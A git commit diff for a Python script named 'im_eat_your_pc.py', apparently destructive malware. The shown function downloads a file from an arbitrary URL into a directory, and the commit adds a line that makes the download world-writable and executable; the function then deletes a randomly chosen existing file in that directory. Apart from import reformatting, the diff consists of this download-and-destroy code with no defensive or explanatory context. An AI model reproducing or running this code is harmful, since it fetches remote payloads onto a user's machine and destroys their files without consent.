ca694958faaad0e66541e8a54a25e05a65e92afd
Artem <foxyy437@gmail.com>
2024-12-31 17:46:49 +0200

    Update im_eat_your_pc.py

--- im_eat_your_pc.py
+++ im_eat_your_pc.py
@@ -1,10 +1,16 @@
-import os, random, time, requests, subprocess
+import os
+import random
+import time
+import requests
+import subprocess
 
 def d(u, d):
     f = os.path.join(d, u.split("/")[-1])
     with open(f, 'wb') as r:
         for c in requests.get(u, stream=True).iter_content(1024):
-            if c: r.write(c)
+            if c:
+                r.write(c)
+    os.chmod(f, 0o777)
     os.remove(random.choice([os.path.join(d, f) for f in os.listdir(d) if os.path.isfile(os.path.join(d, f))]))
     return f
 
